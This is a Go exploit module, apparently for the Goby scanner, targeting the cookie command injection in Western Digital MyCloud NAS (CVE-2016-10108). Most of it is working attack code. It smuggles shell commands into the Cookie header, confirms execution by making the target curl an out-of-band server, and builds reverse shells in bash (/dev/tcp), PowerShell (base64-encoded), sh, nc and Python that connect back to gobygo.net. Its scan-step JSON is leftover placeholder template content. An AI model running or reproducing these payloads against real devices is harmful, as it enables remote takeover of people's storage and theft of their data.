package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Western Digital MyCloud NAS Cookie Command Injection Vulnerability（CVE-2016-10108）",
    "Description": "<p>Western Digital MyCloud NAS is a network-attached storage device designed to provide centralized storage and sharing solutions. It allows users to access files through the network at home or in the office, and supports backup and sharing of multiple devices. </p><p>There is a command execution vulnerability in Cookies in Western Digital MyCloud NAS. Attackers can use this vulnerability to arbitrarily execute code on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "WD-MyCloud",
    "Homepage": "https://support-en.wd.com/",
    "DisclosureDate": "2024-09-25",
    "PostTime": "2024-09-25",
    "Author": "songzhenhong@baimaohui.net",
    "FofaQuery": "body=\"_PROJECT_MODEL_ID_YOSEMITE \" && body=\"_PROJECT_MODEL_ID_LIGHTNING \"",
    "GobyQuery": "body=\"_PROJECT_MODEL_ID_YOSEMITE \" && body=\"_PROJECT_MODEL_ID_LIGHTNING \"",
    "Level": "3",
    "Impact": "<p>There is a command execution vulnerability in Cookies in Western Digital MyCloud NAS. Attackers can use this vulnerability to arbitrarily execute code on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.wdc.com/products/personal-cloud-storage/my-cloud.html\">https://www.wdc.com/products/personal-cloud-storage/my-cloud.html</a> </p><p> 2. Set access policies and whitelist access through firewalls and other security devices. </p><p> 3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByPowershellBase64,ByBash,ByPowershell,BySh,ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2016-10108"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Western Digital MyCloud NAS Cookie 命令注入漏洞（CVE-2016-10108）",
            "Product": "WD-MyCloud",
            "Description": "<p>Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。<br></p><p>Western Digital MyCloud NAS 中Cookie存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.paloaltonetworks.com/\"></a><a href=\"https://www.wdc.com/products/personal-cloud-storage/my-cloud.html\">https://www.wdc.com/products/personal-cloud-storage/my-cloud.html</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>Western Digital MyCloud NAS 中Cookie存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Western Digital MyCloud NAS Cookie Command Injection Vulnerability（CVE-2016-10108）",
            "Product": "WD-MyCloud",
            "Description": "<p>Western Digital MyCloud NAS is a network-attached storage device designed to provide centralized storage and sharing solutions. It allows users to access files through the network at home or in the office, and supports backup and sharing of multiple devices.&nbsp;</p><p>There is a command execution vulnerability in Cookies in Western Digital MyCloud NAS. Attackers can use this vulnerability to arbitrarily execute code on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.wdc.com/products/personal-cloud-storage/my-cloud.html\">https://www.wdc.com/products/personal-cloud-storage/my-cloud.html</a>&nbsp;</p><p>&nbsp;2. Set access policies and whitelist access through firewalls and other security devices.&nbsp;</p><p>&nbsp;3. If it is not necessary, the public network is prohibited from accessing the system.<br></p>",
            "Impact": "<p>There is a command execution vulnerability in Cookies in Western Digital MyCloud NAS. Attackers can use this vulnerability to arbitrarily execute code on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9956"
}`
	// setPayloadRequestHash函数需要再后面增加随机字符串，避免重名
	setPayloadRequestBZD3wnZGY01VBKWMBfL2xJEOXANq9cER := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码

		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败

		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		vulURL = "/"
		requestConfig := httpclient.NewGetRequestConfig(vulURL)
		requestConfig.Header.Store("Cookie", "isAdmin=1; username=admin|echo%20`"+command+"`; local_login=1")
		requestConfig.VerifyTls = false
		requestConfig.Timeout = 15
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed")
			ok = false
			return ok, vulURL, err
		}
		ok = true
		return ok, vulURL, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestBZD3wnZGY01VBKWMBfL2xJEOXANq9cER

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(6)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			if isDomain {
				checkUrl = "http://" + godclient.GetGodServerIP() + "/U" + strings.Split(checkUrl, ".")[1] + "." + strings.Split(checkUrl, ".")[0]
			}

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestBZD3wnZGY01VBKWMBfL2xJEOXANq9cER

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBash" {
							reRequest := regexp.MustCompile("(/dev/tcp/((.|\n)*?)/[0-9]+)")
							getserver := reRequest.FindStringSubmatch(command)
							command = `/bin/bash -c "/bin/sh -i >& ` + getserver[1] + ` 0>&1"`
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
